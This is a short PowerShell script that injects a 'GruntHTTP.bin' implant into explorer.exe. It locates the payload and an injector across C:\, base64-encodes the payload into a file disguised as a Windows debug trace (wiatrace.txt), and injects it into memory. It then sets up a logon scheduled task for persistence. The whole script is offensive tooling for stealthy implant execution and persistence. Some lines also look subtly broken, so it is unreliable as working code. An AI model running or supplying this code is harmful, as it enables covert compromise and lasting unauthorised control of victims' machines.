# Get PID of first occurence of explorer.exe
$procid = (get-process explorer).id | Select-Object -First 1

# Find the absolute path to processinjection.exe and store in variable
$file = 'ProcessInjection.exe'
$searchinfolder = 'C:\'
$processInjection = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}

# Create .txt payload
$filename = Get-ChildItem -path C:\ -Filter GruntHTTP.bin -Recurse | %{$_.FullName}
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | Out-File C:\Windows\debug\wiatrace.txt

# Inject Payload into Memory
$processInjection /pid:$procid /path:C:\Windows\debug\wiatrace.txt /f:base64 /t:1

# Ensure this script runs on boot with a scheduled task. Note system32 is where this script is located
schtasks /create /tn "MyCustomTask" /sc onlogon /tr "start /B C:\Windows\System32\InjectPayloadtoMemoryOnboot.ps1"
